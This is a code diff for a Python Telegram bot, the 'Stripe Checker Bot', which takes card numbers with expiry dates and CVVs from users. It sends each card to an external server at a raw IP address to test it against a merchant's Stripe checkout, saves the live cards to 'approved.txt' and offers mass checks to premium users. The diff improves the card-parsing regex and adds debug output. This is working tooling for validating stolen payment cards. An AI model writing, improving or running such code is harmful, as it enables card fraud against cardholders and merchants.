@@ -18,7 +18,6 @@ CC_FILE = "approved.txt"
 async def check_stripe(card: str, site: str = "redbluechair.com"):
     try:
         url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site={site}"
-        
         timeout = aiohttp.ClientTimeout(total=50)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as res:
@@ -43,21 +42,17 @@ async def check_stripe(card: str, site: str = "redbluechair.com"):
         return {"Response": f"Error: {str(e)[:100]}", "Status": "Declined"}
 
 
-# ================== FIXED UTILITIES ==================
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
             async with aiofiles.open(filename, "w") as f:
                 await f.write(json.dumps({}))
             return {}
-        
         async with aiofiles.open(filename, "r") as f:
             content = await f.read().strip()
-            if not content:
-                return {}
-            return json.loads(content)
-    except Exception:
-        # If file is corrupted, reset it
+            return json.loads(content) if content else {}
+    except:
         async with aiofiles.open(filename, "w") as f:
             await f.write(json.dumps({}))
         return {}
@@ -93,7 +88,7 @@ client = TelegramClient('stripe_bot', API_ID, API_HASH)
 async def start(event):
     if await is_banned_user(event.sender_id):
         return await event.reply("🚫 You are banned!")
-    await event.reply("**🔥 Stripe Checker Bot**\nUse `/mst` to check cards\nExample: `/mst 5443170628782539|06|30|222`")
+    await event.reply("**🔥 Stripe Checker Bot**\nUse `/mst` + cards\nExample: `/mst 5443170628782539|06|30|222`")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
 async def mst(event):
@@ -103,19 +98,28 @@ async def mst(event):
     if event.is_private and not await is_premium_user(event.sender_id):
         return await event.reply("Premium required in PM.")
 
-    # Get text
+    # === DEBUG ===
     if event.reply_to_msg_id:
         reply = await event.get_reply_message()
-        text = reply.text
+        text = reply.text or ""
+        debug_msg = await event.reply("🔍 Debug: Using replied message")
     else:
         text = event.raw_text
+        debug_msg = await event.reply("🔍 Debug: Using command text")
 
-    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', text)
-    
+    print(f"[DEBUG] Raw text: {text}")
+
+    # Stronger regex
+    cards = re.findall(r'\d{15,16}\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4}', text)
+    cards = [re.sub(r'\s+', '', c) for c in cards]   # Remove spaces
+
+    print(f"[DEBUG] Found {len(cards)} cards: {cards}")
+
     if not cards:
-        return await event.reply("❌ No valid cards found!")
+        return await event.reply("❌ No valid cards found!\n\nCorrect format:\n`5443170628782539|06|30|222`")
 
-    cards = cards[:100]
+    cards = cards[:80]
+    await event.reply(f"✅ Starting check on **{len(cards)}** cards...")
     asyncio.create_task(process_mass(event, cards))
 
 
